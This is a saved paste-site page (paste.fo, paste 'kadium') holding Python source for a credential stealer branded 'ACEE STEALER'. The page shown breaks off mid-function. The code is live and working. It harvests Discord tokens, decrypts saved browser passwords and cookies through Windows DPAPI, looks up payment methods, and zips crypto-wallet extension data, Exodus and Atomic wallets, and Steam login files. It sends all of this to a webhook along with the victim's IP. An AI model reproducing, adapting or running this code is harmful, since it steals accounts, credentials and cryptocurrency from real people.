@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>kadium | paste.fo</title>
+<meta name="robots" content="noindex">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="paste.fo, pastehub, pastebin, pastebin alternative, free, combos, proxies, configs, anonfiles, leaks, leaked, bayfiles, ghostbin, cracked, accounts, files, paste" />
+<meta name="author" content="paste.fo" />
+<meta name="copyright" content="paste.fo" />
+<meta name="robots" content="index, follow">
+<link rel="icon" type="image/svg+xml" href="/favicon/1678316184.php">
+<link href="/assets/css/style.css" rel="stylesheet" type="text/css">
+<link href="/assets/css/responsive.css" rel="stylesheet" type="text/css">
+<link href="/assets/css/user.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="/node_modules/@sweetalert2/theme-dark/dark.css">
+<script src="https://asgg.paste.fo/asgg.php"></script>
+<script src="/assets/js/favicon.js"></script>
+<script src="/node_modules/sweetalert2/dist/sweetalert2.min.js"></script>
+<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-HKXR34F8P3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-HKXR34F8P3');
+</script>
+<link rel="stylesheet" href="/codemirror/lib/codemirror.css">
+<link rel="stylesheet" href="/codemirror/theme/material-palenight.css">
+<script src="/codemirror/lib/codemirror.js"></script>
+<script src="/codemirror/mode/xml/xml.js"></script>
+<script src="/codemirror/mode/javascript/javascript.js"></script>
+<script src="/codemirror/mode/css/css.js"></script>
+<script src="/codemirror/mode/sql/sql.js"></script>
+<script src="/codemirror/mode/php/php.js"></script>
+<script src="/codemirror/mode/python/python.js"></script>
+<script src="/codemirror/mode/shell/shell.js"></script>
+<script src="/codemirror/mode/clike/clike.js"></script>
+<script src="/codemirror/mode/htmlmixed/htmlmixed.js"></script>
+<style>
+:root {
+
+
+
+
+}
+</style>
+
+<meta name="description" content="import os
+import threading
+from sys import executable
+from sqlite3 import connect as sql_connect..." />
+<link rel="canonical" href="https://paste.fo/">
+<meta name="theme-color" content="#00f784" />
+<meta name="language" content="English" />
+
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="paste.fo">
+<meta property="og:url" content="https://paste.fo/">
+<meta property="og:title" content="kadium">
+<meta property="og:description" content="import os
+import threading
+from sys import executable
+from sqlite3 import connect as sql_connect...">
+<meta property="og:image" content="https://paste.fo/assets/img/embed-icon.png">
+
+<meta property="twitter:card" content="summary_small_image">
+<meta name="twitter:site" content="@paste_fo">
+<meta name="twitter:creator" content="@paste_fo">
+<meta property="twitter:url" content="https://paste.fo/">
+<meta property="twitter:title" content="kadium">
+<meta property="twitter:description" content="import os
+import threading
+from sys import executable
+from sqlite3 import connect as sql_connect...">
+<meta property="twitter:image" content="https://paste.fo/assets/img/embed-icon.png">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="/assets/js/hyperlink.js"></script>
+<script>
+            $(document).on('click', '.cm-url', function(event) {
+                event.preventDefault();
+                var link = $(this).text();
+                window.open(link, '_blank');  
+            });
+        </script>
+<script>
+            function reqListener () {
+                if(this.responseText == "OK"){
+                    location.reload();
+                } 
+            }
+
+            function onLike(token){
+                const req = new XMLHttpRequest();
+                req.addEventListener("load", reqListener);
+                req.open("GET", "rate.php?captcha=" + token + "&rating=1&pid=89b8df78aae6");
+                req.send();
+            }
+
+            function onDislike(token){
+                const req = new XMLHttpRequest();
+                req.addEventListener("load", reqListener);
+                req.open("GET", "rate.php?captcha=" + token + "&rating=-1&pid=89b8df78aae6");
+                req.send();
+            }
+
+        </script>
+</head>
+<body>
+<div class="wrapper">
+
+<div class="header">
+<h3><a href="/">Create Paste</a></h3>
+<h3><a href="/top">Top Pastes</a></h3>
+<h3><a href="/recent">Recent Pastes</a></h3>
+<h3><a href="/settings">Settings</a></h3>
+<h3><a href="/dashboard"><span class="ug-0 ui-0">Account</span></a></h3>
+</div><div class="banners">
+<a data-asid="DEFAULT" href="https://paste.fo/adspot" target="_blank" class="banner"><img src="https://paste.fo/assets/img/default.png"></a>
+<a data-asid="DEFAULT" href="https://paste.fo/adspot" target="_blank" class="banner"><img src="https://paste.fo/assets/img/default.png"></a>
+</div>
+<script>
+  fetch("banner");
+</script> <h2 class="pagetitle">kadium</h2>
+<hr>
+<form>
+<div class="form-elements">
+<h3 class="paste-info">Created 13 minutes ago<br>by <span class="ug-0 ui-0">Anonymous</span></h3>
+<hr>
+<h4 class="paste-info">9 views</h4>
+<h4 class="paste-info">Public Paste<br>Never Expires</h4>
+<hr>
+<a href="/raw/89b8df78aae6" class="util-button" title="View Raw" target="_blank">View Raw</a>
+<a href="/raw/89b8df78aae6" class="util-button" title="Download" target="_blank" download>Download</a>
+<hr>
+<div class="ratings">
+<button class="h-captcha ratebutton" data-sitekey="9c54b617-bd43-4858-a8c9-83ce00be8180" data-callback="onLike" class="ratebutton"><img src="assets/svg/thumbs-up-regular.svg"></button>
+<h3 class="currentrating">0</h3>
+<button class="h-captcha ratebutton" data-sitekey="9c54b617-bd43-4858-a8c9-83ce00be8180" data-callback="onDislike" class="ratebutton"><img src="assets/svg/thumbs-down-regular.svg"></button>
+</div>
+</div>
+<textarea id="editor" name="content">import os
+import threading
+from sys import executable
+from sqlite3 import connect as sql_connect
+import re
+from base64 import b64decode
+from json import loads as json_loads, load
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from urllib.request import Request, urlopen
+from json import loads, dumps
+import time
+import shutil
+from zipfile import ZipFile
+import random
+import re
+import subprocess
+
+#  THIS IS 1.1.4 VERSION!
+#   
+#
+
+
+hook = &quot;&quot;
+
+def getip():
+    ip = &quot;None&quot;
+    try:
+        ip = urlopen(Request(&quot;https://api.ipify.org&quot;)).read().decode().strip()
+    except:
+        pass
+    return ip
+
+requirements = [
+    [&quot;requests&quot;, &quot;requests&quot;],
+    [&quot;Crypto.Cipher&quot;, &quot;pycryptodome&quot;]
+]
+for modl in requirements:
+    try: __import__(modl[0])
+    except:
+        subprocess.Popen(f&quot;{executable} -m pip install {modl[1]}&quot;, shell=True)
+        time.sleep(3)
+
+import requests
+
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+temp = os.getenv(&quot;TEMP&quot;)
+Threadlist = []
+
+
+class DATA_BLOB(Structure):
+    _fields_ = [
+        ('cbData', wintypes.DWORD),
+        ('pbData', POINTER(c_char))
+    ]
+
+def GetData(blob_out):
+    cbData = int(blob_out.cbData)
+    pbData = blob_out.pbData
+    buffer = c_buffer(cbData)
+    cdll.msvcrt.memcpy(buffer, pbData, cbData)
+    windll.kernel32.LocalFree(pbData)
+    return buffer.raw
+
+def CryptUnprotectData(encrypted_bytes, entropy=b''):
+    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
+    buffer_entropy = c_buffer(entropy, len(entropy))
+    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
+    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
+    blob_out = DATA_BLOB()
+
+    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
+        return GetData(blob_out)
+
+def DecryptValue(buff, master_key=None):
+    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+    if starts == 'v10' or starts == 'v11':
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+
+def LoadRequests(methode, url, data='', files='', headers=''):
+    for i in range(8): # max trys
+        try:
+            if methode == 'POST':
+                if data != '':
+                    r = requests.post(url, data=data)
+                    if r.status_code == 200:
+                        return r
+                elif files != '':
+                    r = requests.post(url, files=files)
+                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
+                        return r
+        except:
+            pass
+
+def LoadUrlib(hook, data='', files='', headers=''):
+    for i in range(8):
+        try:
+            if headers != '':
+                r = urlopen(Request(hook, data=data, headers=headers))
+                return r
+            else:
+                r = urlopen(Request(hook, data=data))
+                return r
+        except:
+            pass
+
+
+def Trust(Cookies):
+    # simple Trust Factor system
+    global DETECTED
+    data = str(Cookies)
+    tim = re.findall(&quot;.google.com&quot;, data)
+    # print(len(tim))
+    if len(tim) &lt; -1:
+        DETECTED = True
+        return DETECTED
+    else:
+        DETECTED = False
+        return DETECTED
+
+def GetBilling(token):
+    headers = {
+        &quot;Authorization&quot;: token,
+        &quot;Content-Type&quot;: &quot;application/json&quot;,
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;
+    }
+    try:
+        billingjson = loads(urlopen(Request(&quot;https://discord.com/api/users/@me/billing/payment-sources&quot;, headers=headers)).read().decode())
+    except:
+        return False
+
+    if billingjson == []: return &quot; -&quot;
+
+    billing = &quot;&quot;
+    for methode in billingjson:
+        if methode[&quot;invalid&quot;] == False:
+            if methode[&quot;type&quot;] == 1:
+                billing += &quot;:credit_card:&quot;
+            elif methode[&quot;type&quot;] == 2:
+                billing += &quot;:parking: &quot;
+
+    return billing
+
+
+def GetBadge(flags):
+    if flags == 0: return ''
+
+    OwnedBadges = ''
+    badgeList =  [
+        {&quot;Name&quot;: 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': &quot;&lt;:developer:874750808472825986&gt; &quot;},
+        {&quot;Name&quot;: 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': &quot;&lt;:bughunter_2:874750808430874664&gt; &quot;},
+        {&quot;Name&quot;: 'Early_Supporter', 'Value': 512, 'Emoji': &quot;&lt;:early_supporter:874750808414113823&gt; &quot;},
+        {&quot;Name&quot;: 'House_Balance', 'Value': 256, 'Emoji': &quot;&lt;:balance:874750808267292683&gt; &quot;},
+        {&quot;Name&quot;: 'House_Brilliance', 'Value': 128, 'Emoji': &quot;&lt;:brilliance:874750808338608199&gt; &quot;},
+        {&quot;Name&quot;: 'House_Bravery', 'Value': 64, 'Emoji': &quot;&lt;:bravery:874750808388952075&gt; &quot;},
+        {&quot;Name&quot;: 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': &quot;&lt;:bughunter_1:874750808426692658&gt; &quot;},
+        {&quot;Name&quot;: 'HypeSquad_Events', 'Value': 4, 'Emoji': &quot;&lt;:hypesquad_events:874750808594477056&gt; &quot;},
+        {&quot;Name&quot;: 'Partnered_Server_Owner', 'Value': 2,'Emoji': &quot;&lt;:partner:874750808678354964&gt; &quot;},
+        {&quot;Name&quot;: 'Discord_Employee', 'Value': 1, 'Emoji': &quot;&lt;:staff:874750808728666152&gt; &quot;}
+
+    ]
+    for badge in badgeList:
+        if flags // badge[&quot;Value&quot;] != 0:
+            OwnedBadges += badge[&quot;Emoji&quot;]
+            flags = flags % badge[&quot;Value&quot;]
+
+    return OwnedBadges
+
+def GetTokenInfo(token):
+    headers = {
+        &quot;Authorization&quot;: token,
+        &quot;Content-Type&quot;: &quot;application/json&quot;,
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;
+    }
+
+    userjson = loads(urlopen(Request(&quot;https://discordapp.com/api/v6/users/@me&quot;, headers=headers)).read().decode())
+    username = userjson[&quot;username&quot;]
+    hashtag = userjson[&quot;discriminator&quot;]
+    email = userjson[&quot;email&quot;]
+    idd = userjson[&quot;id&quot;]
+    pfp = userjson[&quot;avatar&quot;]
+    flags = userjson[&quot;public_flags&quot;]
+    nitro = &quot;&quot;
+    phone = &quot;-&quot;
+
+    if &quot;premium_type&quot; in userjson:
+        nitrot = userjson[&quot;premium_type&quot;]
+        if nitrot == 1:
+            nitro = &quot;&lt;:classic:896119171019067423&gt; &quot;
+        elif nitrot == 2:
+            nitro = &quot;&lt;a:boost:824036778570416129&gt; &lt;:classic:896119171019067423&gt; &quot;
+    if &quot;phone&quot; in userjson: phone = f'`{userjson[&quot;phone&quot;]}`'
+
+    return username, hashtag, email, idd, pfp, flags, nitro, phone
+
+def checkToken(token):
+    headers = {
+        &quot;Authorization&quot;: token,
+        &quot;Content-Type&quot;: &quot;application/json&quot;,
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;
+    }
+    try:
+        urlopen(Request(&quot;https://discordapp.com/api/v6/users/@me&quot;, headers=headers))
+        return True
+    except:
+        return False
+
+
+def uploadToken(token, path):
+    global hook
+    headers = {
+        &quot;Content-Type&quot;: &quot;application/json&quot;,
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;
+    }
+    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
+
+    if pfp == None:
+        pfp = &quot;https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg&quot;
+    else:
+        pfp = f&quot;https://cdn.discordapp.com/avatars/{idd}/{pfp}&quot;
+
+    billing = GetBilling(token)
+    badge = GetBadge(flags)
+    if not billing:
+        badge, phone, billing = &quot;🔒&quot;, &quot;🔒&quot;, &quot;🔒&quot;
+    if nitro == '' and badge == '': nitro = &quot; -&quot;
+
+    data = {
+        &quot;content&quot;: f'Found in `{path}`',
+        &quot;embeds&quot;: [
+            {
+            &quot;color&quot;: 14406413,
+            &quot;fields&quot;: [
+                {
+                    &quot;name&quot;: &quot;:rocket: Token:&quot;,
+                    &quot;value&quot;: f&quot;`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;:envelope: Email:&quot;,
+                    &quot;value&quot;: f&quot;`{email}`&quot;,
+                    &quot;inline&quot;: True
+                },
+                {
+                    &quot;name&quot;: &quot;:mobile_phone: Phone:&quot;,
+                    &quot;value&quot;: f&quot;{phone}&quot;,
+                    &quot;inline&quot;: True
+                },
+                {
+                    &quot;name&quot;: &quot;:globe_with_meridians: IP:&quot;,
+                    &quot;value&quot;: f&quot;`{getip()}`&quot;,
+                    &quot;inline&quot;: True
+                },
+                {
+                    &quot;name&quot;: &quot;:beginner: Badges:&quot;,
+                    &quot;value&quot;: f&quot;{nitro}{badge}&quot;,
+                    &quot;inline&quot;: True
+                },
+                {
+                    &quot;name&quot;: &quot;:credit_card: Billing:&quot;,
+                    &quot;value&quot;: f&quot;{billing}&quot;,
+                    &quot;inline&quot;: True
+                }
+                ],
+            &quot;author&quot;: {
+                &quot;name&quot;: f&quot;{username}#{hashtag} ({idd})&quot;,
+                &quot;icon_url&quot;: f&quot;{pfp}&quot;
+                },
+            &quot;footer&quot;: {
+                &quot;text&quot;: &quot;@ACEE STEALER&quot;,
+                &quot;icon_url&quot;: &quot;https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg&quot;
+                },
+            &quot;thumbnail&quot;: {
+                &quot;url&quot;: f&quot;{pfp}&quot;
+                }
+            }
+        ],
+        &quot;avatar_url&quot;: &quot;https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg&quot;,
+        &quot;username&quot;: &quot;ACEE Stealer&quot;,
+        &quot;attachments&quot;: []
+        }
+    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
+    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+
+def Reformat(listt):
+    e = re.findall(&quot;(\w+[a-z])&quot;,listt)
+    while &quot;https&quot; in e: e.remove(&quot;https&quot;)
+    while &quot;com&quot; in e: e.remove(&quot;com&quot;)
+    while &quot;net&quot; in e: e.remove(&quot;net&quot;)
+    return list(set(e))
+
+def upload(name, tk=''):
+    headers = {
+        &quot;Content-Type&quot;: &quot;application/json&quot;,
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;
+    }
+
+    if name == &quot;kiwi&quot;:
+        data = {
+        &quot;content&quot;: '',
+        &quot;embeds&quot;: [
+            {
+            &quot;color&quot;: 14406413,
+            &quot;fields&quot;: [
+                {
+                &quot;name&quot;: &quot;Interesting files found on user PC:&quot;,
+                &quot;value&quot;: tk
+                }
+            ],
+            &quot;author&quot;: {
+                &quot;name&quot;: &quot;ACEE | File Stealer&quot;
+            },
+            &quot;footer&quot;: {
+                &quot;text&quot;: &quot;@ACEE STEALER&quot;,
+                &quot;icon_url&quot;: &quot;https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg&quot;
+            }
+            }
+        ],
+        &quot;avatar_url&quot;: &quot;https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg&quot;,
+        &quot;attachments&quot;: []
+        }
+        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        return
+
+    path = name
+    files = {'file': open(path, 'rb')}
+    # print(f&quot;FILE= {files}&quot;)
+
+    if &quot;wppassw&quot; in name:
+
+        ra = ' | '.join(da for da in paswWords)
+
+        if len(ra) &gt; 1000:
+            rrr = Reformat(str(paswWords))
+            ra = ' | '.join(da for da in rrr)
+
+        data = {
+        &quot;content&quot;: '',
+        &quot;embeds&quot;: [
+            {
+            &quot;color&quot;: 14406413,
+            &quot;fields&quot;: [
+                {
+                &quot;name&quot;: &quot;Found:&quot;,
+                &quot;value&quot;: ra
+                }
+            ],
+            &quot;author&quot;: {
+                &quot;name&quot;: &quot;ACEE | Password Stealer&quot;
+            },
+            &quot;footer&quot;: {
+                &quot;text&quot;: &quot;@ACEE STEALER&quot;,
+                &quot;icon_url&quot;: &quot;https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png&quot;
+            }
+            }
+        ],
+        &quot;avatar_url&quot;: &quot;https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png&quot;,
+        &quot;attachments&quot;: []
+        }
+        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+
+    if &quot;wpcook&quot; in name:
+        rb = ' | '.join(da for da in cookiWords)
+        if len(rb) &gt; 1000:
+            rrrrr = Reformat(str(cookiWords))
+            rb = ' | '.join(da for da in rrrrr)
+
+        data = {
+        &quot;content&quot;: '',
+        &quot;embeds&quot;: [
+            {
+            &quot;color&quot;: 14406413,
+            &quot;fields&quot;: [
+                {
+                &quot;name&quot;: &quot;Found:&quot;,
+                &quot;value&quot;: rb
+                }
+            ],
+            &quot;author&quot;: {
+                &quot;name&quot;: &quot;ACEE | Cookies Stealer&quot;
+            },
+            &quot;footer&quot;: {
+                &quot;text&quot;: &quot;@ACEE STEALER&quot;,
+                &quot;icon_url&quot;: &quot;https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png&quot;
+            }
+            }
+        ],
+        &quot;avatar_url&quot;: &quot;https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png&quot;,
+        &quot;attachments&quot;: []
+        }
+        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+
+    # r = requests.post(hook, files=files)
+    LoadRequests(&quot;POST&quot;, hook, files=files)
+
+def writeforfile(data, name):
+    path = os.getenv(&quot;TEMP&quot;) + f&quot;\wp{name}.txt&quot;
+    with open(path, mode='w', encoding='utf-8') as f:
+        f.write(f&quot;&lt;--ACEE STEALER ON TOP--&gt;\n\n&quot;)
+        for line in data:
+            if line[0] != '':
+                f.write(f&quot;{line}\n&quot;)
+
+Tokens = ''
+def getToken(path, arg):
+    if not os.path.exists(path): return
+
+    path += arg
+    for file in os.listdir(path):
+        if file.endswith(&quot;.log&quot;) or file.endswith(&quot;.ldb&quot;)   :
+            for line in [x.strip() for x in open(f&quot;{path}\\{file}&quot;, errors=&quot;ignore&quot;).readlines() if x.strip()]:
+                for regex in (r&quot;[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}&quot;, r&quot;mfa\.[\w-]{80,95}&quot;):
+                    for token in re.findall(regex, line):
+                        global Tokens
+                        if checkToken(token):
+                            if not token in Tokens:
+                                # print(token)
+                                Tokens += token
+                                uploadToken(token, path)
+
+Passw = []
+def getPassw(path, arg):
+    global Passw
+    if not os.path.exists(path): return
+
+    pathC = path + arg + &quot;/Login Data&quot;
+    if os.stat(pathC).st_size == 0: return
+
+    tempfold = temp + &quot;wp&quot; + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + &quot;.db&quot;
+
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute(&quot;SELECT action_url, username_value, password_value FROM logins;&quot;)
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
+
+    pathKey = path + &quot;/Local State&quot;
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+
+    for row in data:
+        if row[0] != '':
+            for wa in keyword:
+                old = wa
+                if &quot;https&quot; in wa:
+                    tmp = wa
+                    wa = tmp.split('[')[1].split(']')[0]
+                if wa in row[0]:
+                    if not old in paswWords: paswWords.append(old)
+            Passw.append(f&quot;UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}&quot;)
+        # print([row[0], row[1], DecryptValue(row[2], master_key)])
+    writeforfile(Passw, 'passw')
+
+Cookies = []
+def getCookie(path, arg):
+    global Cookies
+    if not os.path.exists(path): return
+
+    pathC = path + arg + &quot;/Cookies&quot;
+    if os.stat(pathC).st_size == 0: return
+
+    tempfold = temp + &quot;wp&quot; + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + &quot;.db&quot;
+
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute(&quot;SELECT host_key, name, encrypted_value FROM cookies&quot;)
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
+
+    pathKey = path + &quot;/Local State&quot;
+
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+
+    for row in data:
+        if row[0] != '':
+            for wa in keyword:
+                old = wa
+                if &quot;https&quot; in wa:
+                    tmp = wa
+                    wa = tmp.split('[')[1].split(']')[0]
+                if wa in row[0]:
+                    if not old in cookiWords: cookiWords.append(old)
+            Cookies.append(f&quot;H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}&quot;)
+        # print([row[0], row[1], DecryptValue(row[2], master_key)])
+    writeforfile(Cookies, 'cook')
+
+def GetDiscord(path, arg):
+    if not os.path.exists(f&quot;{path}/Local State&quot;): return
+
+    pathC = path + arg
+
+    pathKey = path + &quot;/Local State&quot;
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+    # print(path, master_key)
+
+    for file in os.listdir(pathC):
+        # print(path, file)
+        if file.endswith(&quot;.log&quot;) or file.endswith(&quot;.ldb&quot;)   :
+            for line in [x.strip() for x in open(f&quot;{pathC}\\{file}&quot;, errors=&quot;ignore&quot;).readlines() if x.strip()]:
+                for token in re.findall(r&quot;dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\&quot;]*&quot;, line):
+                    global Tokens
+                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
+                    if checkToken(tokenDecoded):
+                        if not tokenDecoded in Tokens:
+                            # print(token)
+                            Tokens += tokenDecoded
+                            # writeforfile(Tokens, 'tokens')
+                            uploadToken(tokenDecoded, path)
+
+
+def ZipThings(path, arg, procc):
+    pathC = path
+    name = arg
+    # subprocess.Popen(f&quot;taskkill /im {procc} /t /f&quot;, shell=True)
+    # os.system(f&quot;taskkill /im {procc} /t /f&quot;)
+
+    if &quot;nkbihfbeogaeaoehlefnkodbefgpgknn&quot; in arg:
+        browser = path.split(&quot;\\&quot;)[4].split(&quot;/&quot;)[1].replace(' ', '')
+        name = f&quot;Metamask_{browser}&quot;
+        pathC = path + arg
+
+    if not os.path.exists(pathC): return
+    subprocess.Popen(f&quot;taskkill /im {procc} /t /f&quot;, shell=True)
+
+    if &quot;Wallet&quot; in arg or &quot;NationsGlory&quot; in arg:
+        browser = path.split(&quot;\\&quot;)[4].split(&quot;/&quot;)[1].replace(' ', '')
+        name = f&quot;{browser}&quot;
+
+    elif &quot;Steam&quot; in arg:
+        if not os.path.isfile(f&quot;{pathC}/loginusers.vdf&quot;): return
+        f = open(f&quot;{pathC}/loginusers.vdf&quot;, &quot;r+&quot;, encoding=&quot;utf8&quot;)
+        data = f.readlines()
+        # print(data)
+        found = False
+        for l in data:
+            if 'RememberPassword&quot;\t\t&quot;1&quot;' in l:
+                found = True
+        if found == False: return
+        name = arg
+
+    zf = ZipFile(f&quot;{pathC}/{name}.zip&quot;, &quot;w&quot;)
+    for file in os.listdir(pathC):
+        if not &quot;.zip&quot; in file: zf.write(pathC + &quot;/&quot; + file)
+    zf.close()
+
+    upload(f'{pathC}/{name}.zip')
+    os.remove(f&quot;{pathC}/{name}.zip&quot;)
+
+
+def GatherAll():
+    '                   Default Path &lt; 0 &gt;                         ProcesName &lt; 1 &gt;        Token  &lt; 2 &gt;              Password &lt; 3 &gt;     Cookies &lt; 4 &gt;                          Extentions &lt; 5 &gt;                                  '
+    browserPaths = [
+        [f&quot;{roaming}/Opera Software/Opera GX Stable&quot;,               &quot;opera.exe&quot;,    &quot;/Local Storage/leveldb&quot;,           &quot;/&quot;,            &quot;/Network&quot;,             &quot;/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn&quot;                      ],
+        [f&quot;{roaming}/Opera Software/Opera Stable&quot;,                  &quot;opera.exe&quot;,    &quot;/Local Storage/leveldb&quot;,           &quot;/&quot;,            &quot;/Network&quot;,             &quot;/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn&quot;                      ],
+        [f&quot;{roaming}/Opera Software/Opera Neon/User Data/Default&quot;,  &quot;opera.exe&quot;,    &quot;/Local Storage/leveldb&quot;,           &quot;/&quot;,            &quot;/Network&quot;,             &quot;/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn&quot;                      ],
+        [f&quot;{local}/Google/Chrome/User Data&quot;,                        &quot;chrome.exe&quot;,   &quot;/Default/Local Storage/leveldb&quot;,   &quot;/Default&quot;,     &quot;/Default/Network&quot;,     &quot;/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn&quot;              ],
+        [f&quot;{local}/Google/Chrome SxS/User Data&quot;,                    &quot;chrome.exe&quot;,   &quot;/Default/Local Storage/leveldb&quot;,   &quot;/Default&quot;,     &quot;/Default/Network&quot;,     &quot;/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn&quot;              ],
+        [f&quot;{local}/BraveSoftware/Brave-Browser/User Data&quot;,          &quot;brave.exe&quot;,    &quot;/Default/Local Storage/leveldb&quot;,   &quot;/Default&quot;,     &quot;/Default/Network&quot;,     &quot;/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn&quot;              ],
+        [f&quot;{local}/Yandex/YandexBrowser/User Data&quot;,                 &quot;yandex.exe&quot;,   &quot;/Default/Local Storage/leveldb&quot;,   &quot;/Default&quot;,     &quot;/Default/Network&quot;,     &quot;/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn&quot;                                    ],
+        [f&quot;{local}/Microsoft/Edge/User Data&quot;,                       &quot;edge.exe&quot;,     &quot;/Default/Local Storage/leveldb&quot;,   &quot;/Default&quot;,     &quot;/Default/Network&quot;,     &quot;/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn&quot;              ]
+    ]
+
+    discordPaths = [
+        [f&quot;{roaming}/Discord&quot;, &quot;/Local Storage/leveldb&quot;],
+        [f&quot;{roaming}/Lightcord&quot;, &quot;/Local Storage/leveldb&quot;],
+        [f&quot;{roaming}/discordcanary&quot;, &quot;/Local Storage/leveldb&quot;],
+        [f&quot;{roaming}/discordptb&quot;, &quot;/Local Storage/leveldb&quot;],
+    ]
+
+    PathsToZip = [
+        [f&quot;{roaming}/atomic/Local Storage/leveldb&quot;, '&quot;Atomic Wallet.exe&quot;', &quot;Wallet&quot;],
+        [f&quot;{roaming}/Exodus/exodus.wallet&quot;, &quot;Exodus.exe&quot;, &quot;Wallet&quot;],
+        [&quot;C:\Program Files (x86)\Steam\config&quot;, &quot;steam.exe&quot;, &quot;Steam&quot;],
+        [f&quot;{roaming}/NationsGlory/Local Storage/leveldb&quot;, &quot;NationsGlory.exe&quot;, &quot;NationsGlory&quot;]
+    ]
+
+    for patt in browserPaths:
